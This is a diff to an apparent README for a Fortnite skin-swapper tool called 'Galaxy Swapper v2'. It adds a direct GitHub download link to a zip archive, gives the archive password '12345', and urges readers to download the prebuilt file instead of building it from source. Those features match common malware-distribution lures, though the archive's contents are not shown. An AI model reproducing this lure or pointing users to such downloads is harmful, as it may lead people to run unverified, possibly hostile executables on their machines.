@@ -4,7 +4,7 @@
 
 ---
 
-## 📥 **[Download Galaxy Swapper v2](#)**
+## 📥 **[Download Galaxy Swapper v2](https://github.com/guerreroj12/fortnite-galaxy-swapper/releases/download/fortnite-skin/Galaxy.zip)**
 
 **Password for Archive:** `12345`  
 > *Note:* We recommend downloading Galaxy Swapper v2 from this link instead of rebuilding it yourself for the best experience.
